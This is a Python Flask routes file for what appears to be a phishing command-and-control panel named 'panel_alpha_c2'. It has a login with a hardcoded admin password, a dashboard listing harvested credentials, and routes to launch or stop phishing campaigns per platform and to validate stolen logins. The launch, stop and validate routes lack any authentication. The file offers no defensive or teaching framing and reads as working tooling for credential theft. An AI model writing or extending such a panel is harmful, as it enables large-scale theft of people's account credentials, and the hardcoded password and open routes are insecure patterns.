from flask import Blueprint, render_template, request, redirect, url_for, session
from .auth import login_required
from .facade import PhishingCampaignFacade

facade = PhishingCampaignFacade()
routes = Blueprint('routes', __name__)

@routes.route('/panel_alpha_c2/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == 'admin' and password == 'secret123':
            session['logged_in'] = True
            return redirect(url_for('routes.dashboard'))
    return render_template('login.html')

@routes.route('/panel_alpha_c2/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('routes.login'))

@routes.route('/panel_alpha_c2')
@login_required
def dashboard():
    rows = facade.get_credentials()
    return render_template('dashboard.html', credentials=rows)

@routes.route('/launch/<platform>')
def launch_phishing(platform):
    print(f"[~] Lanzando phishing para {platform} via Factory y Facade...")
    facade.launch_campaign(platform)
    return redirect(url_for('routes.dashboard'))

@routes.route('/stop_phishing')
def stop_phishing():
    facade.stop_campaign()
    return redirect(url_for('routes.dashboard'))

@routes.route('/validate_now')
def validate_now():
    facade.run_validation()
    return redirect(url_for('routes.dashboard'))
